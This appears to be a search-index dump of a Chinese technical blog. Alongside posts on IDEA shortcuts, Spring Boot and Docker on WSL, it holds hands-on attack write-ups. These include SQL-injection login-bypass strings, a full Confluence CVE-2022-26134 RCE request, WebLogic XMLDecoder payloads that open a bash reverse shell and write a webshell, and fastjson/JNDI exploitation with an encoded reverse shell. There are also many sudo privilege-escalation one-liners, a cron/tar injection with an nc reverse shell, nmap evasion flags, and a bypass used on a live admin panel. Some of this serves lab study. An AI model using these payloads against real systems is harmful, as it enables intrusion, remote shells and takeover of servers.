&#x27;1&#x27;=&#x27;1&#x27;/*1234 &#x27; AND 1=0 UNION ALL SELECT &#x27;admin&#x27;, &#x27;81dc9bdb52d04dc20036dbd8313ed055admin&quot; --admin&quot; #admin&quot;/*admin&quot; or &quot;1&quot;=&quot;1admin&quot; or &quot;1&quot;=&quot;1&quot;--admin&quot; or &quot;1&quot;=&quot;1&quot;#admin&quot; or &quot;1&quot;=&quot;1&quot;/*admin&quot;or 1=1 or &quot;&quot;=&quot;admin&quot; or 1=1admin&quot; or 1=1--admin&quot; or 1=1#admin&quot; or 1=1/*admin&quot;) or (&quot;1&quot;=&quot;1admin&quot;) or (&quot;1&quot;=&quot;1&quot;--admin&quot;) or (&quot;1&quot;=&quot;1&quot;#admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*admin&quot;) or &quot;1&quot;=&quot;1admin&quot;) or &quot;1&quot;=&quot;1&quot;--admin&quot;) or &quot;1&quot;=&quot;1&quot;#admin&quot;) or &quot;1&quot;=&quot;1&quot;/*1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055","categories":[],"tags":[]},{"title":"","slug":"IDEA快速编码","date":"2024-02-26T01:22:49.743Z","updated":"2022-01-12T06:39:19.352Z","comments":true,"path":"2024/02/26/IDEA快速编码/","permalink":"http://example.com/2024/02/26/IDEA%E5%BF%AB%E9%80%9F%E7%BC%96%E7%A0%81/","excerpt":"","text":"一、 日常开发常用快捷键简介：介绍日常开发中高频使用到的快捷键。 1234567891011121314151617181920212223242526272829快捷键 解释Tab 代码补全Ctrl+c 复制Ctrl+d 复制当前行到下一行Ctrl+v 粘贴ctrl+shift+v 选择待粘贴的内容Ctrl+x 剪切Ctrl + y 删除当前当标所在行Ctrl+z 撤消Ctrl+Shift+z 反撤消Ctrl + / 单行注释Ctrl + Shift + / 多行注释alt +Shift + ↑ 当前行上移alt +Shift + ↓ 当前行下移动Shift + Tab 往左移动当前行内容Tab 往右移动当前行内容Ctrl + alt+ L 格式化代码alt + ← 退回到前一个编辑窗口alt + → 进入下一个编辑的窗口Ctrl + Shift + u 大小写转换alt+insert 生成setter、getter等Ctrl+alt+v 快速生成返回值alt+enter 导包，实现接口中的方法F2 快速跳至错误处ctrl+alt+← 快速跳到上次鼠标停留处ctrl+alt+→ 快速跳到下次鼠标停留处Ctrl+Alt+t 快速生成分支、循环、异常处理等代码块ctrl+e 打开最近修改的文件ctrl+j 注入常用的代码 二、 快速查找及替换简介：介绍查询文件、代码时常使用到的快捷键。 查询文件、代码时常用到的快捷键 12345678快捷键 解释Ctrl+f 查找当前文件内容Ctrl + r 查找并替换当前文件里的内容Ctrl+Shift+f 全局搜索文件内容Ctrl+Shift+r 全局搜索并替换文件内容Ctrl + n 查找java文件Ctrl+Shift+n 查找非java文件，如 yml，properties等double click shift 查找所有文件、方法，忽略文件里的内容 三、 快速重构简介：介绍与重构相关的快捷键。 123456快捷键 解释ctrl+Alt+h 查看方法被哪里引用ctrl+Alt+m 快速抽取方法shift+f6 快速重命名类名、方法名ctrl+alt+b 跳到接口或抽象的具体实现 四、 基础编码相关快捷键简介：介绍编译、运行、调试相关的快捷键。 1234567快捷键 解释ctrl+shift+f10 运行当前类shift+f10 运行当前选择的ctrl+shift+f9 重新编译当前类Alt+Shift+f9 选择debugshift+f9 进入debugctrl+f2 终止程序","categories":[],"tags":[]},{"title":"","slug":"spring_boot","date":"2024-02-26T01:22:49.743Z","updated":"2021-11-29T00:55:09.675Z","comments":true,"path":"2024/02/26/spring_boot/","permalink":"http://example.com/2024/02/26/spring_boot/","excerpt":"","text":"Spring Boot配置绑定配置绑定就是将配置中的值与javabean中对应的属性进行绑定 1.使用@ConfigurationProperties 标注在 JavaBean 的类名上 2.使用@Value注解 JavaBean 的属性上 12@Component 注解来添加组件到容器中@ConfigurationProperties(prefix = &quot;person&quot;) 只有在容器中的组件，才会拥有 SpringBoot 提供的强大功能 导入Spring配置 使用 @ImportResource 注解加载 Spring 配置文件 使用全注解方式加载 Spring 配置 123456781.@Configuration 注解定义配置类，替换 Spring 的配置文；2.//配置类内部可以包含有一个或多个被 @Bean 注解的方法，这些方法会被 AnnotationConfigApplicationContext 或 AnnotationConfigWebApplicationContext 类扫描，构建 bean 定义（相当于 Spring 配置文件中的&lt;bean&gt;&lt;/bean&gt;标签），方法的返回值会以组件的形式添加到容器中，组件的 id 就是方法名。 /*** @Configuration 注解用于定义一个配置类，相当于 Spring 的配置文件* 配置类中包含一个或多个被 @Bean 注解的方法，该方法相当于 Spring 配置文件中的 &lt;bean&gt; 标签定义的组件。*/ 注解12345678910111213141516171819启动注解 @SpringBootApplication@SpringBootConfiguration 注解，继承@Configuration注解，主要用于加载配置文件@EnableAutoConfiguration 注解，开启自动配置功能@ComponentScan 注解，主要用于组件扫描和自动装配@Controller控制器，处理http请求。@RestController 复合注解 查看@RestController源码@RequestMapping 是 Spring Web 应用程序中最常被用到的注解之一。这个注解会将 HTTP 请求映射到 MVC 和 REST 控制器的处理方法上@GetMapping用于将HTTP get请求映射到特定处理程序的方法注解注解简写：@RequestMapping(value = &quot;/say&quot;,method = RequestMethod.GET)等价于：@GetMapping(value = &quot;/say&quot;)@PostMapping用于将HTTP post请求映射到特定处理程序的方法注解@PathVariable:获取url中的数据@RequestParam:获取请求参数的值@RequestHeader 把Request请求header部分的值绑定到方法的参数上@CookieValue 把Request header中关于cookie的值绑定到方法的参数上@RepositoryDAO层注解，DAO层中接口继承JpaRepository&lt;T,ID extends Serializable&gt;,需要在build.gradle中引入相关jpa的一个jar自动加载。","categories":[],"tags":[]},{"title":"","slug":"windows子系统ubuntu安装docker","date":"2024-01-08T02:24:18.386Z","updated":"2024-01-08T03:28:34.230Z","comments":true,"path":"2024/01/08/windows子系统ubuntu安装docker/","permalink":"http://example.com/2024/01/08/windows%E5%AD%90%E7%B3%BB%E7%BB%9Fubuntu%E5%AE%89%E8%A3%85docker/","excerpt":"","text":"windows子系统ubuntu安装dockerUbuntu 22.04安装docker访问docker 官网，获取ubuntu安装命令: 1.先删除旧版本1sudo apt-get remove docker docker-engine docker.io containerd runc 2.更新 ubuntu 更新数据源列表1sudo apt-get update 3.安装 https 请求库12345sudo apt-get install \\ ca-certificates \\ curl \\ gnupg \\ lsb-release 4.添加Docker的官方GPG密钥12sudo mkdir -p /etc/apt/keyringscurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg 5.使用以下命令设置存储库1234echo \\ &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null 6.安装docker 引擎12sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 7. 测试安装docker 是否成功1sudo docker run hello-world 报错信息 1https://blog.csdn.net/lupengfei1009/article/details/94637398 Ubantu 报错：System has not been booted with systemd as init system (PID 1). Can‘t operate.WSL 中暂时不支持 systemctl，所以使用下面的命令会报错。 1sudo systemctl 报错信息为 System has not been booted with systemd as init system (PID 1). Can’t operate.Failed to connect to bus: Host is down 使用service 换wsl2","categories":[],"tags":[]},{"title":"cve-2022-26134复现","slug":"cve-2022-26134复现","date":"2022-06-11T07:41:48.000Z","updated":"2022-06-12T09:15:49.948Z","comments":true,"path":"2022/06/11/cve-2022-26134复现/","permalink":"http://example.com/2022/06/11/cve-2022-26134%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"cve-2022-26134复现Atlassian Confluence是一个专业的企业知识管理与协同软件，主要用于公司内员工创建知识库并建立知识管理流程，也可以用于构建企业wiki。其使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。因此，该系统被国内较多知名互联网企业所采用，应用范围较广，因此该漏洞威胁影响范围较大。 漏洞概述Atlassian Confluence存在远程代码执行漏洞，攻击者可以利用该漏洞直接获取目标系统权限。 2022年6月2日，Atlassian发布安全公告，公布了一个Confluence Server和Data Center中的远程代码执行漏洞。 漏洞编号：CVE-2022-26134 漏洞威胁等级：严重 漏洞复现POC数据包： 123456789GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: XX.XX.XX.XXUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=3764D915B037D5A50D8025AA793E990AConnection: close 修复方案 官方修复方案： 官方已发布版本 7.4.17、7.13.7、7.14.3、7.15.2、7.16.4、7.17.4 和 7.18.1，其中包含对此漏洞的修复。请尽快升级到新版本 下载地址： https://www.atlassian.com/software/confluence/download-archives 临时缓释方案： 下载官方发布的xwork-1.0.3-atlassian-10.jar替换confluence&#x2F;WEB-INF&#x2F;lib&#x2F;目录下原来的xwork jar文件，并重启Confluence 下载地址： https://packages.atlassian.com/maven-internal/opensymphony/xwork/1.0.3-atlassian-10/xwork-1.0.3-atlassian-10.jar","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"cve","slug":"cve","permalink":"http://example.com/tags/cve/"}]},{"title":"weblogic漏洞复现","slug":"weblogic漏洞复现","date":"2022-06-11T02:13:20.000Z","updated":"2022-06-12T09:15:49.949Z","comments":true,"path":"2022/06/11/weblogic漏洞复现/","permalink":"http://example.com/2022/06/11/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"weblogic漏洞复现1.Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）漏洞描述1Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 环境搭建123启动测试环境：docker-compose up -d等待一段时间，访问`http://your-ip:7001/`即可看到一个404页面，说明weblogic已成功启动。 123456Error 404--Not FoundFrom RFC 2068 Hypertext Transfer Protocol -- HTTP/1.1:xxxxxx Not FoundThe server has not found anything matching the Request-URI. No indication is given of whether the condition is temporary or permanent.If the server does not wish to make this information available to the client, the status code 403 (Forbidden) can be used instead. The 410 (Gone) status code SHOULD be used if the server knows, through some internally configurable mechanism, that an old resource is permanently unavailable and has no forwarding address. 漏洞复现1.访问http://ip:7001/wls-wsat/CoordinatorPortType11，存在下图说明可能有漏洞 2.监听端口 1nc -lvp port 使用burp 发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）： 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 4.反弹shell 5.写入文件，访问：http://your-ip:7001/bea_wls_internal/test.jsp）： 12345678910111213141516171819202122232425262728POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 638&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=&quot;println&quot;&gt;&lt;string&gt; &lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method=&quot;close&quot;/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 成功访问写入的shell 上传冰蝎 2.Weblogic 任意文件上传漏洞（CVE-2018-2894）Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。 利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。 漏洞环境执行如下命令，启动weblogic 12.2.1.3： 1docker-compose up -d 环境启动后，访问http://your-ip:7001/console，即可看到后台登录页面。 执行docker-compose logs | grep password可查看管理员密码，管理员用户名为weblogic。 登录后台页面，点击base_domain的配置，在“高级”中开启“启用 Web 服务测试页”选项： 漏洞复现访问http://your-ip:7001/ws_utc/config.do，设置Work Home Dir为/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。 然后在安全设置下可以上传webshell，通过burp抓取上传后的数据包，其中有时间戳 然后访问http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell：","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"weblogic","slug":"weblogic","permalink":"http://example.com/tags/weblogic/"}]},{"title":"Lin.Security靶机渗透","slug":"Lin-Security靶机渗透","date":"2022-06-01T12:50:54.000Z","updated":"2022-06-12T09:15:49.947Z","comments":true,"path":"2022/06/01/Lin-Security靶机渗透/","permalink":"http://example.com/2022/06/01/Lin-Security%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","excerpt":"","text":"Lin.Security靶机渗透使用以下凭据登录主机账号密码：bob &#x2F; secret 下载地址：https://in.security/downloads/lin.security_v1.0.ova 环境配置开机的一瞬间，按shift，然后按e，就会进入命令行，如下图，修改 rw signie init=/bin/bash,中间的Maybe-ubiquity是原本就有的, 碰到一个博主修改错误的配置方法，搞我心态！！！ 按ctrl+x或者F10重启，重启之后查看网卡为ens33 ifconfig -a 12vim /etc/netplan/50-cloud-init.yamlnetplan apply //配置应用生效 重启 信息收集1.namp扫描 1nmap -sS -sV -T4 -p- 192.168.134.137 1ssh bob@192.168.134.137 sudo提权 sudo -l 查看支持root权限的命令 12345/bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp, /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat, /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl, /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp socat权限 先建立一个1234的shell 1sudo socat tcp-listen:1234,reuseaddr,fork exec:sh,pty,stderr,setsid,sigint,sane 新建一个远程连接，在启动本地1234的listen 1socat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:1234 awk权限 1sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27; ed提权 ed命令用于启动ed文本编辑器，使用ed命令访问空缓冲区来调用bash&#x2F;sh shell造成提权。 12sudo ed!sh 这里有个问题，exit无法退出，需要使用w保存，q退出： find提权 1sudo find . -exec /bin/sh \\; -quit env环境变量提权 1234应用程序使用了system等函数调用了系统命令，但是没有使用绝对路径而是使用env命令从环境变量中进行查找，这就可能通过修改环境变量来进行权限提升sudo sh -c &#x27;cp $(which env) .; chmod +s ./env&#x27;./env /bin/sh -p less、more、man提权 123456789sudo less /etc/passwd!/bin/sh sudo more /etc/passwd!/bin/sh Sudo man man !/bin/sh expect提权 expect是一个自动化交互套件，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。 1sudo expect -c &quot;spawn /bin/sh;interact&quot; scp提权 1234TF=$(mktemp)echo &#x27;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; &gt; $TFchmod +x &quot;$TF&quot;sudo scp -S $TF x y: 123sudo pico^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0 ssh提权 1sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x vi提权 1sudo vi -c &#x27;:!/bin/sh&#x27; /dev/null pico提权 123sudo pico^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0 1这个操作方法：在键盘上按住ctrl+r和ctrl+x然后执行下面的命令，执行完成之后再次按住ctrl+r和ctrl+x再输入要执行的命令，比如id，那么就会以root权限执行 rvim提权 1sudo rvim -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27; perl提权 1sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;s tclsh提权 12sudo tclshexec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderrs git提权 12sudo git -p help config!/bin/sh script提权 1sudo script -q /dev/null 密码信息收集提权 cat &#x2F;etc&#x2F;passwd, 类似root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash，在这种情况下，x表示该用户的密码哈希存储在&#x2F;etc&#x2F;shadow中 尝试爆破 taskset提权：1taskset 1 /bin/bash -p 定时任务cron提权：查看定时任务cat &#x2F;etc&#x2F;crontab 1.在kali上生成反弹shell的payload： 1msfvenom -p cmd/unix/reverse_netcat lhost=192.168.134.130 lport=1234 R payload 1mkfifo /tmp/wkee; nc 192.168.134.130 1234 0&lt;/tmp/wkee | /bin/sh &gt;/tmp/wkee 2&gt;&amp;1; rm /tmp/wkee 2.将payload写入到定时任务的sh文件中： 123echo &quot;mkfifo /tmp/wkee; nc 192.168.134.130 1234 0&lt;/tmp/wkee | /bin/sh &gt;/tmp/wkee 2&gt;&amp;1; rm /tmp/wkee&quot; &gt; shell.sh &amp;&amp; chmod +x shell.shecho &quot;&quot; &gt; &quot;–checkpoint-action=exec=sh shell.sh&quot; //注入一个指定检查点动作的标志echo &quot;&quot; &gt; --checkpoint=1 //注入一个标志来指定我们的检查点 3.打开另一个窗口，重新远程登陆，进行监听，成功反弹shell","categories":[],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"JNDI-Injection-Exploit学习使用","slug":"JNDI-Injection-Exploit学习使用","date":"2022-05-27T05:23:38.000Z","updated":"2022-05-28T03:05:30.249Z","comments":true,"path":"2022/05/27/JNDI-Injection-Exploit学习使用/","permalink":"http://example.com/2022/05/27/JNDI-Injection-Exploit%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"","text":"JNDI-Injection-Exploit学习使用在系统中发现json交互请求，尝试利⽤dnslog的⽅式判断后端json框架，成功收到dnslog请求，判断系统使⽤了fastjson框架 1234dnslog 回显&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dbslog地址&quot;&#125;&#125; 反弹地址进行base64编码 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.20.100.4&#x2F;39001 0&gt;&amp;1 本地执行1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzYuMTExLjY4LzM5MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;172.20.100.5&quot; 直接使用java -jar开启监听出现问题，JVM_Bind被占用 123456789101112Exception in thread &quot;main&quot; java.net.BindException: Address already in use: JVM_Bind at java.net.DualStackPlainSocketImpl.bind0(Native Method) at java.net.DualStackPlainSocketImpl.socketBind(Unknown Source) at java.net.AbstractPlainSocketImpl.bind(Unknown Source) at java.net.PlainSocketImpl.bind(Unknown Source) at java.net.ServerSocket.bind(Unknown Source) at java.net.ServerSocket.&lt;init&gt;(Unknown Source) at java.net.ServerSocket.&lt;init&gt;(Unknown Source) at javax.net.DefaultServerSocketFactory.createServerSocket(Unknown Source) at jndi.RMIRefServer.&lt;init&gt;(RMIRefServer.java:80) at run.ServerStart.&lt;init&gt;(ServerStart.java:87) at run.ServerStart.main(ServerStart.java:56) 12345netstat -aon | findstr “8180”netstat -aon | findstr “1099”netstat -aon | findstr “1389”tasklist | findstr “3500”进一步查看3500进程的具体信息。taskkill /pid 3500 /F 结束占用的进程 12345678910111213141516[ADDRESS] &gt;&gt; 172.20.100.5[COMMAND] &gt;&gt; bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzYuMTExLjY4LzM5MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;----------------------------JNDI Links----------------------------Target environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.20.100.5:1099/z4qacyldap://172.20.100.5:1389/z4qacyTarget environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.20.100.5:1099/s6tqzaTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.20.100.5:1099/84c8dhldap://172.20.100.5:1389/84c8dh----------------------------Server Log----------------------------2022-05-27 13:45:50 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:81802022-05-27 13:45:50 [RMISERVER] &gt;&gt; Listening on 0.0.0.0:10992022-05-27 13:45:53 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389 监听端口 nc lvp 39001 使⽤payload进⾏漏洞攻击1234&#123; &quot;a&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;: &#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi://172.20.100.5:1099/84c8dh&quot;,&quot;autoCommit&quot;: true &#125;&#125;","categories":[],"tags":[{"name":"JNDI-Injection-Exploit","slug":"JNDI-Injection-Exploit","permalink":"http://example.com/tags/JNDI-Injection-Exploit/"}]},{"title":"nmap的学习使用","slug":"nmap的学习使用","date":"2022-05-26T11:39:36.000Z","updated":"2022-05-29T04:09:33.233Z","comments":true,"path":"2022/05/26/nmap的学习使用/","permalink":"http://example.com/2022/05/26/nmap%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"","text":"nmap的学习使用1nmap -T4 -A -sS -vv -Pn 目标说明-iL 从已有的ip列表文件中读取并扫描 -iR+扫描数量 随机选择目标进行扫描 --exclude+ip 不扫描此ip 主机发现-sL 列出要扫描的ip -sn 不进行端口扫描 -Pn 将所有主机都默认为在线，跳过主机发现 -PS/PA/PU/PY 使用TCP、SYN&#x2F;ACK、udp或SCTP协议去发现端口 -PE/PP/PM：使用ICMP响应（echo）、时间戳或子网掩码请求来发现探测 -PO 使用IP协议的ping -n 不做DNS解析 -R 总是做DNS反向解析 --dns-servers指定自定义的DNS服务器 --system-dns 使用操作系统的DNS --traceroute 追踪每台主机的跳转路径 扫描技术-sS/sT/sA/sW/sM：使用SYN、TCP、全连接Connect()、ACK、Window、Maimon来进行扫描 -sU UDP扫描 -sN/sF/sX 使用TCP Null(无flag)、FIN、Xmas（FIN+Push+Urgent）扫描 --scanflags +flags 自定义TCP扫描的flags -sI 僵尸机扫描 -sY/sZ 使用SCTP协议的INIT&#x2F;COOKIE-ECHO扫描 -sO 进行IP协议扫描 -b &lt;FTP relay host&gt;：指定FTP中继主机进行FTP反弹扫描端口说明和扫描规则-p 只扫描指定的端口 --exclude-ports 不对此端口进行扫描 -F 快速模式，扫描比默认端口数量更少的端口 -r 有序地扫描端口而不是随机地扫描 --top-ports &lt;number&gt; 扫描排名指定的数字前几位的最常用的端口 --port-ratio &lt;ratio&gt; 扫描比输入的比例更常用的端口 服务、版本探测-sV：探测开启的端口来获取服务、版本信息 --version-intensity &lt;level&gt;：设置探测服务、版本信息的强度 --version-light：强度为2的探测强度 --version-all：强度为9的探测强度 --version-trace：将扫描的具体过程显示出来 脚本扫描-sC：等同于–script&#x3D;default --script=&lt;Lua scripts&gt;：指定使用Lua脚本进行扫描 --script-args=&lt;n1=v1,[n2=v2,...]&gt;：指定脚本的参数 --script-args-file=filename：指定提供脚本参数的文件 --script-trace：显示全部发送和收到的数据 --script-updatedb：更新脚本的数据库 --script-help=&lt;Lua scripts&gt;：显示脚本的相关信息 系统探测-O：进行系统探测 --osscan-limit：限制系统探测的目标，如只探测Linux系统 --osscan-guess：更侵略性地猜测系统 定时和性能-T&lt;0-5&gt;：设置时序模块，越高越快 --min-hostgroup/max-hostgroup &lt;size&gt;：指定最小、最大的并行主机扫描组大小 --min-parallelism/max-parallelism &lt;numprobes&gt;：指定最小、最大并行探测数量 --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;：指定最小、最大的扫描往返时间 --max-retries &lt;tries&gt;：指定最大的重发扫描包的次数 --host-timeout &lt;time&gt;：指定超时时间 --scan-delay/--max-scan-delay &lt;time&gt;：指定每次探测延迟多长时间，即两次探测之间间隔多少时间 --min-rate &lt;number&gt;：最小的发包速率 --max-rate &lt;number&gt;：最大的发包速率 防火墙、IDS绕过和欺骗-f; --mtu &lt;val&gt;：设置MTU最大传输单元 -D &lt;decoy1,decoy2[,ME],...&gt;：伪造多个IP地址和源地址一同发送包，从而隐藏在众多的IP地址中而不易被发现 -S &lt;IP_Address&gt;：伪造源地址 -e &lt;iface&gt;：使用指定的接口 -g/--source-port &lt;portnum&gt;：使用指定的源端口 --proxies &lt;url1,[url2],...&gt;：指定代理服务器进行扫描 --data &lt;hex string&gt;：在发送包的数据字段中追加自定义的十六进制字符串 --data-string &lt;string&gt;：在发送包的数据字段中追加自定义的ASCII字符串 --data-length &lt;num&gt;：在发送包的数据字段中追加随机的数据 --ip-options &lt;options&gt;：使用指定的IP选项发送包 --ttl &lt;val&gt;：设置TTL值 --spoof-mac &lt;mac address/prefix/vendor name&gt;：伪造源Mac地址 --badsum：发送伪造TCP&#x2F;UDP&#x2F;SCTP校验和Checksum的数据包 输出-oN/-oX/-oS/-oG &lt;file&gt;：分别输出正常、XML、s| 杂项-6：扫描IPv6的地址 -A：一次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描 --datadir &lt;dirname&gt;：指定自定义的数据文件位置 --send-eth/--send-ip：使用原始以太网帧或IP数据包发送 --privileged：假设用户有全部权限 --unprivileged：假设用户缺少原始套接字权限 -V：输出版本号 -h：输出帮助信息","categories":[],"tags":[{"name":"nmap","slug":"nmap","permalink":"http://example.com/tags/nmap/"}]},{"title":"偶遇挖洞","slug":"偶遇挖洞","date":"2022-05-26T05:34:45.000Z","updated":"2022-05-27T02:22:03.164Z","comments":true,"path":"2022/05/26/偶遇挖洞/","permalink":"http://example.com/2022/05/26/%E5%81%B6%E9%81%87%E6%8C%96%E6%B4%9E/","excerpt":"","text":"偶遇挖洞经历一波谷歌hack，已知某后台地址 &#x2F;manage&#x2F;login.asp,后台万能密码：’or’&#x3D;’or’ 可直接登陆 1.后台万能密码登录 账号root，万能密码 ‘or’&#x3D;’or’这直接进入后台 2.xss漏洞在前端找到一处搜索框，f12，使用双引号闭合 